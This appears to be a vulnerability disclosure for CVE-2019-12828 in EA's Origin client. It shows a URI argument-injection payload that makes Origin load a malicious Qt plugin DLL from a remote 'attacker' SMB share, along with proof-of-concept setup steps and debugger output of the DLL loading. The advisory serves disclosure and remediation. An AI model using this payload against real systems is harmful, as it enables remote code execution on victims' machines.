# Electronic Arts Origin Client URI Handler Remote Code Execution (CVE-2019-12828)

April 24, 2019

## Affected Vendor:

Electronic Arts

## Tested Versions:

Origin Client 10.5.37.24524 on x86 Windows 7 SP1 and IE 11
Download: https://www.dm.origin.com/download

## Vulnerability Details:

The EA Origin Client uses the Qt5 GUI framework and installs the following URI pluggable protocol handler for 'origin' and 'origin2' schemes:
```
[HKEY_CLASSES_ROOT\origin2\shell\open\command]
@="\"C:\\Program Files\\Origin\\Origin.exe\" \"%1\""
```
Similar to the bugs covered in the recent ZDI blog post, Origin.exe fails to validate the user provided parameters. As a result, the "platformpluginpath" command line option of QGuiApplication can be injected and pointed towards an attacker controlled server. If this server is hosting a malicious Qt plugin, it will be loaded via `LoadLibraryW()` thereby resulting in arbitrary code execution.

The injection can be performed like so:
```
origin2:?" -platformpluginpath \\attacker\dlls "
```
causing the application to be launched as follows:
```
"C:\Program Files\Origin\Origin.exe" "origin2:?" -platformpluginpath \\attacker\dlls ""
```

## Remediation:

URI pluggable protocol handlers must ensure that they correctly validate the URI as it may contain malicious data.

## Proof of Concept:

A proof-of-concept has been provided to illustrate the impact of the vulnerability. Perform the following:

1) Create an anonymous SMB share named "dlls" on the attacker's machine.
2) Copy origin.dll to a folder named "imageformats" in the "dlls" share.
3) Create an entry in the target's hosts file pointing the domain "attacker" to the attacker's machine.
4) Open poc.html on the target's machine.


## WinDbg Output:
```
Microsoft (R) Windows Debugger Version 6.12.0002.633 X86
Copyright (c) Microsoft Corporation. All rights reserved.

CommandLine: "C:\Program Files\Origin\Origin.exe" "origin2:?" -platformpluginpath \\attacker\dlls ""
Symbol search path is: *** Invalid ***
****************************************************************************
* Symbol loading may be unreliable without a symbol search path.           *
* Use .symfix to have the debugger choose a symbol path.                   *
* After setting your symbol path, use .reload to refresh symbol locations. *
****************************************************************************
Executable search path is: 
ModLoad: 01190000 01490000   Origin.exe
ModLoad: 778b0000 779f2000   ntdll.dll
eax=011cd86e ebx=7ffdb000 ecx=00000000 edx=00000000 esi=00000000 edi=00000000
eip=778f6c58 esp=001cfe00 ebp=00000000 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000200
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for ntdll.dll - 
ntdll!RtlUserThreadStart:
778f6c58 89442404        mov     dword ptr [esp+4],eax ss:0023:001cfe04=00000000
0:000> sxd ld
0:000> g
[... truncated for readability...]
ModLoad: 6f0d0000 6f0d8000   C:\Windows\System32\npmproxy.dll
ModLoad: 6f500000 6f596000   C:\Windows\system32\wbem\fastprox.dll
ModLoad: 70580000 70598000   C:\Windows\system32\NTDSAPI.dll
ModLoad: 722e0000 722e7000   \\attacker\dlls\imageformats\origin.dll
>>>>>>> DllMain
```

## Shoutouts

@zer0pwn found this bug around the same time as I did and wrote a much more in-depth post on it: https://zero.lol/2019-05-22-fun-with-uri-handlers/